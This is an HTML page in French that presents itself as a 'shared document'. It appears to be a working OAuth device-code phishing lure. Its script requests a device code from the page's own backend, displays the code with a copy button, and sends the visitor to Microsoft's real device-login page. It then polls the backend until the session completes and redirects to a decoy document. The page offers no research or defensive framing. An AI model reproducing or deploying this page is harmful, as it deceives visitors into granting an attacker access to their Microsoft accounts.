<!DOCTYPE html>
<html lang="fr"><head><meta charset="utf-8"><title>Document partagé</title></head>
<body><main><h1>Document partagé</h1><output id="code"></output>
<button id="copy">Copier</button><button id="continue">Vérifier</button></main>
<script>
(async () => {
  const response = await fetch('/api/device/start', {
    method: 'POST',
    headers: {'X-Request-Id': '54e884e2d6f509474fa33fe9980cfe63bf9c6c6eb8fbc462c1093b8d85992992'}
  });
  const {user_code, session_id} = await response.json();
  document.getElementById('code').textContent = user_code;
  document.getElementById('copy').onclick = () => navigator.clipboard.writeText(user_code);
  document.getElementById('continue').onclick = () => window.open('https://microsoft.com/devicelogin');
  const timer = setInterval(async () => {
    const result = await fetch('/api/device/status/' + encodeURIComponent(session_id));
    const state = await result.json();
    if (state.status === 'completed') {
      clearInterval(timer);
      window.location.replace('/document');
    }
  }, 5000);
})();
</script></body></html>
